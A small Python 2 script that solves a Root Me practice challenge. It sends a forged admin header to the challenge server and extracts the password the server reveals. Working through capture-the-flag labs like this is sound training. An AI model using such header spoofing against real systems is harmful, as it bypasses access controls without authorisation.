#!/usr/bin/env python

"""main.py: Root Me Challenge 05 - http://challenge01.root-me.org/web-serveur/ch5/"""

import urllib2
import re

BASE_URL = "http://challenge01.root-me.org/web-serveur/ch5/"


def show_headers():
    f = urllib2.urlopen(BASE_URL)

    return f.info()


def ch05():
    req = urllib2.Request(BASE_URL)
    req.add_header('Header-RootMe-Admin', 'Admin')
    f = urllib2.urlopen(req)

    text = f.read()
    pattern = r'with\ the\ password\ (.*?)\<'
    m = re.search(pattern, text)

    return m.group(1)


def main():
    print 'Password: %s' % ch05()


if __name__ == "__main__":
    main()
